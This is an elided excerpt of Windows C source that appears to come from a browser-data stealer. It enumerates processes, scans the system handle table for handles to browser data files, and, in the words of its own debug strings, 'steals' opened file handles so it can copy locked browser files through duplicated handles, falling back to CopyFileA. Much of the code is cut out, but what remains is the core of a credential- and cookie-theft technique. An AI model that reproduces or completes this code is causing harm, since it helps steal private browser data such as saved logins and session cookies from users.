...
#define PIDS_ARRAY_GROWTH_FACTOR    2
     ...
     PROCESSENTRY32  ProcessEntry32     = { .dwSize = sizeof(PROCESSENTRY32) };
     PDWORD          pdwPids            = NULL,
                     pdwTemp            = NULL;
     DWORD           dwCount            = 0x00,
...
#undef GROWTH_FACTOR
    ...
    __try
    {
        for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles && !bResult; i++)
        {
            ...
            {
                DBGA("[+] Found Target File Handle In Process: %lu", (ULONG)pEntry->UniqueProcessId);
...
LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
{
    ...
    if ((dwDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE)))
    {
        for (DWORD i = 0; i < g_dwPathCacheCount; i++)
        {
            if (dwDataFilePathHash == g_PathCache[i].dwOgDataFilePathHash)
            {
                ...
                // DBGA("[i] Data File Fetched From Cache");
    ...
    do
    {
        ...
        DBGA("[i] Found %lu Running Browser Processes", dwPidCount);
        DBGA("[i] Attempting To Steal Opened File Handles...");
        ...
        {
            DBGA("[+] Successfully Copied File Via Duplicated Handle");
    ...
    if (!bCopiedViaHandle)
    {
        // DBGA("[i] Target File Handle Was Not Found, Falling Back To CopyFileA");
